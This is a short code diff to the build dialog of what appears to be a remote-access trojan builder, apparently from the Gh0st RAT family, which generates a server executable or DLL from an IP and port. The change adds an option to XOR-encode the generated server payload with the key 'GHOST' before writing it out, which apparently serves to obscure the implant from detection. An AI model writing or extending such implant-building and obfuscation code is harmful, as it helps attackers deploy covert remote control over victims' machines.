@@ -31,6 +31,7 @@ void CBuildDlg::DoDataExchange(CDataExchange* pDX)
 	DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
 	DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
 	DDX_Control(pDX, IDC_COMBO_EXE, m_ComboExe);
+	DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
 }
 
 
@@ -135,7 +136,8 @@ void CBuildDlg::OnBnClickedOk()
 			MessageBox(strSeverFile + "\r\n服务程序\"" + strSeverFile + "\"创建失败!");
 			return CDialog::OnOK();
 		}
-		File.Write(szBuffer,dwFileSize);
+		Encrypt(szBuffer, dwFileSize, m_ComboEncrypt.GetCurSel());
+		File.Write(szBuffer, dwFileSize);
 		File.Close();
 		delete[] szBuffer;
 		MessageBox("生成成功!文件位于:\r\n"+ strSeverFile);
@@ -182,6 +184,24 @@ BOOL CBuildDlg::OnInitDialog()
 	m_ComboExe.InsertString(CLIENT_TYPE_MODULE, "ServerDll.dll");
 	m_ComboExe.SetCurSel(0);
 
+	m_ComboEncrypt.InsertString(0, "无");
+	m_ComboEncrypt.InsertString(1, "XOR");
+	m_ComboEncrypt.SetCurSel(0);
+
 	return TRUE;  // return TRUE unless you set the focus to a control
 				  // 异常: OCX 属性页应返回 FALSE
+}
+
+Buffer CBuildDlg::Encrypt(BYTE* buffer, int len, int method) {
+	switch (method)
+	{
+	case 0:// 不加密
+		break;
+	case 1: // XOR
+		xor_encrypt_decrypt(buffer, len, { 'G', 'H', 'O', 'S', 'T' });
+		break;
+	default:
+		break;
+	}
+	return Buffer();
 }
